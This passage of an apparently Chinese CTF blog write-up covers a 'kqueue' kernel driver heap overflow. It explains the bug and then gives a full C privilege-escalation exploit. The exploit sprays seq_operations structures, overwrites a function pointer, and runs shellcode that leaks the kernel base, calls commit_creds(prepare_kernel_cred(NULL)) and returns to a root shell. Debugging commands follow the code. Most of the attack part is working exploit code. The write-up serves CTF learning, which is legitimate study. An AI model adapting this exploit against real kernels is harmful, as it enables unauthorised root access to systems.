+<p>没开smep/smap,KPTI,本题可使用ret2usr,<strong>但是由于开启了kalsr，我们似乎并无法找到prepare_kernel_cred 和 commit_creds 的地址</strong></p>
+<p>但是可以通过编写shellcode利用内核栈上的数据来获得内核基址去执行commit_creds(prepare_kernel_cred(NULL))，着陆回用户态</p>
+<h3 id="0x03-Exploit">0x03 Exploit</h3>
+<p><strong>分析一下这个exp：</strong></p>
+<p>首先保存一下用户态的寄存器值，为后续返回用户态准备</p>
+<p>接着打开/dev/kqueue这个设备，与kqueue.ko这个驱动来交互</p>
+<p>create_kqueue我们定<code>request.max_entries=0xffffffff</code>，大小定为0x20个存shellcode的指针</p>
+<p>edit_kqueue我们写入这0x20个shellcode的指针</p>
+<p>我们堆喷射大量<code>seq_operations</code> 结构体，这里open了0x200次<code>/proc/self/stat</code>这个结构体</p>
+<p>用save_kqueue变更长度从0x18-&gt;0x40,溢出了0x28，也就是5个shellcode指针到了内存外，我们堆喷后，大概率是为<code>seq_operations</code> 结构体分配的内存，我们覆盖了start指针为shellcode的指针</p>
+<p>我们一次用read来触发，调用start指针，执行我们的shellcode</p>
+<p><strong>shellcode功能：</strong></p>
+<p>取栈上存的内核符号的地址，得出基址，rop出commit_creds(prepare_kernel_cred(NULL))，返回用户态，生成shell</p>
+<p>（主要是如何调试出来要减的值，我先在还不太会。）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc get_root.c -static -masm=intel -g -o get_root</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/stat.h&gt;</span></span><br><br><span class="hljs-type">long</span> dev_fd;<br><span class="hljs-type">size_t</span> user_cs, user_ss, user_rflags, user_sp;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">save_status</span><span class="hljs-params">()</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov user_cs,cs;&quot;</span><br>        <span class="hljs-string">&quot;mov user_ss,ss;&quot;</span><br>        <span class="hljs-string">&quot;mov user_sp,rsp;&quot;</span><br>        <span class="hljs-string">&quot;pushf;&quot;</span><br>        <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>    );<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful saved status!\033[0m\n&quot;</span>);<br><br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">spawn_shell</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(!getuid())<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successful to get the root. spawn_shell now...\033[0m&quot;</span>);<br>        system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">size_t</span> root_rip;<br><span class="hljs-type">void</span> <span class="hljs-title function_">shellcode</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    __asm__(<br>        <span class="hljs-string">&quot;mov r12 ,[rsp+0x8];&quot;</span><br>        <span class="hljs-string">&quot;sub r12 ,0x201179;&quot;</span><br>        <span class="hljs-string">&quot;mov r13 ,r12;&quot;</span><br>        <span class="hljs-string">&quot;add r12 ,0x8c580;&quot;</span><br>        <span class="hljs-string">&quot;add r13 ,0x8c140;&quot;</span><br>        <span class="hljs-string">&quot;xor rdi ,rdi;&quot;</span><br>        <span class="hljs-string">&quot;call r12;&quot;</span><br>        <span class="hljs-string">&quot;mov rdi, rax;&quot;</span><br>        <span class="hljs-string">&quot;call r13;&quot;</span><br>        <span class="hljs-string">&quot;swapgs;&quot;</span><br>        <span class="hljs-string">&quot;mov r14 ,user_ss;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14 ,user_sp;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14 ,user_rflags;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14 ,user_cs;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;mov r14 ,root_rip;&quot;</span><br>        <span class="hljs-string">&quot;push r14;&quot;</span><br>        <span class="hljs-string">&quot;iretq;&quot;</span><br><br>    );<br>&#125;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span>&#123;</span><br>    <span class="hljs-type">uint32_t</span> max_entries;<br>    <span class="hljs-type">uint16_t</span> data_size;<br>    <span class="hljs-type">uint16_t</span> entry_idx;<br>    <span class="hljs-type">uint16_t</span> queue_idx;<br>    <span class="hljs-type">char</span>* data;<br>&#125;<span class="hljs-type">request_t</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">createQueue</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> max_entries ,<span class="hljs-type">uint16_t</span> data_size)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> req =<br>    &#123;<br>        .max_entries = max_entries,<br>        .data_size = data_size,<br>    &#125;;<br><br>    ioctl(dev_fd,<span class="hljs-number">0xDEADC0DE</span>,&amp;req);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">editQueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> queue_idx,<span class="hljs-type">uint16_t</span> entry_idx,<span class="hljs-type">char</span> *data)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> req =<br>    &#123;<br>        .queue_idx = queue_idx,<br>        .entry_idx = entry_idx,<br>        .data =data,<br>    &#125;;<br>    ioctl(dev_fd,<span class="hljs-number">0xDAADEEEE</span>,&amp;req);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">deleteQueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> queue_idx)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> req =<br>    &#123;<br>        .queue_idx=queue_idx,<br>    &#125;;<br>    ioctl(dev_fd,<span class="hljs-number">0xBADDCAFE</span>,&amp;req);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveQueue</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> queue_idx,<span class="hljs-type">uint32_t</span> max_entries, <span class="hljs-type">uint16_t</span> data_size)</span><br>&#123;<br>    <span class="hljs-type">request_t</span> req =<br>    &#123;<br>        .queue_idx = queue_idx,<br>        .max_entries=max_entries,<br>        .data_size =data_size,<br>    &#125;;<br><br>    ioctl(dev_fd,<span class="hljs-number">0xB105BABE</span>,&amp;req);<br><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> seq_fd[<span class="hljs-number">0x200</span>];<br>    <span class="hljs-type">size_t</span> *page;<br>    <span class="hljs-type">size_t</span> data[<span class="hljs-number">0x20</span>];<br>    save_status();<br>    root_rip = (<span class="hljs-type">size_t</span>) spawn_shell;<br>    dev_fd = open(<span class="hljs-string">&quot;/dev/kqueue&quot;</span>,O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dev_fd&lt;<span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;open /dev/kqueue failed!&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i =<span class="hljs-number">0</span> ;i&lt;<span class="hljs-number">0x20</span>;i++)<br>        data[i]=(<span class="hljs-type">size_t</span>) shellcode ;<br>    <br>    createQueue(<span class="hljs-number">0xffffffff</span>,<span class="hljs-number">0x20</span>*<span class="hljs-number">8</span>);<br>    editQueue(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,data);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;<span class="hljs-number">0x200</span>;i++)<br>        seq_fd[i]=open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>,O_RDONLY);<br>    saveQueue(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0x40</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span> ; i&lt;<span class="hljs-number">0x200</span> ;i++)<br>        read(seq_fd[i],data,<span class="hljs-number">1</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure>
+<p>成功提权<img src="/2022/11/19/0x06kernelheapoverflow/06kernelheapoverflow.png" srcset="/img/loading.gif" lazyload alt="06kernelheapoverflow"></p>
+<h3 id="0x04再记调试方法">0x04再记调试方法</h3>
+<p>在qemu中查找kqueue.ko的.text段的地址</p>
+<p>需要root权限，我们可以在init中修改1000为0方便我们调试</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /sys/module/kqueue/sections/.text<br></code></pre></td></tr></table></figure>
+<p>启动自己解压缩bzimage里面的./vmlinux</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo gdb ./vmlinux -q<br></code></pre></td></tr></table></figure>
+<p>解压bzImage命令,extract-vmlinux文件gitbub取</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./extract-vmlinux ./bzImage &gt; vmlinux<br></code></pre></td></tr></table></figure>
+<p>在gdb中载入驱动kqueue.ko的符号地址</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">add</span><span class="language-bash">-symbol-file ./kqueue.ko 0xffffffffc00dc000</span><br></code></pre></td></tr></table></figure>
+<p>然后连接端口</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">target</span> remote localhost:<span class="hljs-number">1234</span><br></code></pre></td></tr></table></figure>
+<p>可以断指定函数</p>
+<script src="https://utteranc.es/client.js" repo="nqoinaen/comment" issue-term="pathname" theme="github-light" crossorigin="anonymous" async>
+</script>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/kernel-pwn/" class="category-chain-item">kernel pwn</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/kernel-heap-overflow/">#kernel heap overflow</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>0x06 kernel heap-Heap OverFlow</div>
+      <div>https://nqoinaen.github.io/2022/11/19/0x06kernelheapoverflow/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>nqoinaen</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2022年11月19日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2022年11月19日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/11/16/newstarctf2022/" title="2022NewStarCTF PWN">
+                        <span class="hidden-mobile">2022NewStarCTF PWN</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'nqoinaen.github.io');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
